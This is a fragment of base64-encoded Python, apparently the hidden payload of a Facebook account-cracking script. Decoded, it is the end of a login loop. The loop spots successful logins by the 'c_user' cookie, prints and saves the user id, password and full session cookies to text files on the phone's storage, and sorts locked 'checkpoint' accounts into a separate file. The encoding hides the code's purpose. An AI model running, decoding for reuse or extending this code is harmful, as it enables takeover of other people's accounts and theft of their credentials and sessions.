gICAgICAgICAgIGxvZ19jb29raWVzPXNlc3Npb24uY29va2llcy5nZXRfZGljdCgpLmtleXMoKQ0KICAgICAgICAgICAgaWYgJ2NfdXNlcicgaW4gbG9nX2Nvb2tpZXM6DQogICAgICAgICAgICAgICAgY29raT0iOyIuam9pbihba2V5KyI9Iit2YWx1ZSBmb3Iga2V5LHZhbHVlIGluIHNlc3Npb24uY29va2llcy5nZXRfZGljdCgpLml0ZW1zKCldKQ0KICAgICAgICAgICAgICAgIGNpZCA9IGNva2lbNzoyMl0NCiAgICAgICAgICAgICAgICBhc3JhZihmJyBbd2hpdGVdfiBbcmVkM11bW2JvbGQgYnJpZ2h0X3llbGxvd11PSyBBQ0NPVU5U8J+SmltyZWQzXV1bYnJpZ2h0X3llbGxvd10tPiBbYm9sZCBicmlnaHRfZ3JlZW5dJyt1aWQrJyA9ICcrcHMrJycpDQogICAgICAgICAgICAgICAgYXNyYWYoZicgW3doaXRlXX4gW3JlZDNdW1tib2xkIGJyaWdodF95ZWxsb3ddSU0gQ09PS0lF8J+SnFtyZWQzXV1bYnJpZ2h0X3llbGxvd10tPiBbYm9sZCBicmlnaHRfZ3JlZW5dJytjb2tpKQ0KICAgICAgICAgICAgICAgIG9wZW4oJy9zZGNhcmQvSEFTQU4tT0sudHh0JywgJ2EnKS53cml0ZSggdWlkKycgfCAnK3BzKydcbicpDQogICAgICAgICAgICAgICAgb2tzLmFwcGVuZChjaWQpDQogICAgICAgICAgICAgICAgYnJlYWsNCiAgICAgICAgICAgIGVsaWYgJ2NoZWNrcG9pbnQnIGluIGxvZ19jb29raWVzOg0KICAgICAgICAgICAgICAgIGNva2k9IjsiLmpvaW4oW2tleSsiPSIrdmFsdWUgZm9yIGtleSx2YWx1ZSBpbiBzZXNzaW9uLmNvb2tpZXMuZ2V0X2RpY3QoKS5pdGVtcygpXSkNCiAgICAgICAgICAgICAgICBjaWQgPSBjb2tpWzI0OjM5XQ0KICAgICAgICAgICAgICAgIGFzcmFmKCdbcmVkM10gfiBbU09SUlkgQ1AgQUNDT1VOVPCfkpRdLT4gJyt1aWQrJyA9ICcrcHMrJyAnKQ0KICAgICAgICAgICAgICAgIG9wZW4oJy9zZGNhcmQvU09SUlktQ1AudHh0JywgJ2EnKS53cml0ZSggdWlkKycgfCAnK3BzKycgXG4nKQ0KICAgICAgICAgICAgICAgIGNwcy5hcHBlbmQoY2lkKQ0KICAgICAgICAgICAgICAgIGJyZWFrDQogICAgICAgICAgICBlbHNlOg0KICAgICAgICAgICAgICAgIGNvbnRpbnVlDQogICAgICAgIGxvb3ArPTENCiAgICBleGNlcHQ6DQogICAgICAgIHBhc3MNCiANCm1haW4oKQ=='))